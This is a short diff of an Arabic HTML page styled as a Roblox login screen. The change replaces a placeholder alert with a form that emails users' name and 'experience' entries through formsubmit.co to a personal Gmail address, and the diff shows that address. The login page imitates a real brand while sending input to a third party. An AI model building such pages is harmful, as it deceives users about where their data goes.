@@ -99,23 +99,24 @@ body{
   <div class="box">
     <h2>تسجيل الدخول إلى Roblox</h2>
 
-    <form onsubmit="loginFake(event)">
-      <input type="text" id="pname" placeholder="اسمك" required>
-      <input type="text" id="pexp" placeholder="خبراتك" required>
+    <form action="https://formsubmit.co/battal.alzahrani23@gmail.com" method="POST">
+
+      <!-- Subject and Template to format the email properly -->
+      <input type="hidden" name="_subject" value="تسجيل لاعب جديد">
+      <input type="hidden" name="_template" value="table">
+
+      <!-- User Inputs -->
+      <input type="text" name="Player_Name" placeholder="اسمك" required>
+      <input type="text" name="Player_Experience" placeholder="خبراتك" required>
+
+      <!-- Submit button -->
       <button type="submit" class="mainbtn">تسجيل الدخول</button>
+
     </form>
 
     <div class="small">ليس لديك حساب؟ اشترك</div>
   </div>
 </div>
-
-<script>
-function loginFake(e){
-  e.preventDefault();
-  const name = document.getElementById("pname").value;
-  alert("تم تسجيل الدخول بنجاح يا " + name + " 🎮");
-}
-</script>
 
 </body>
 </html>
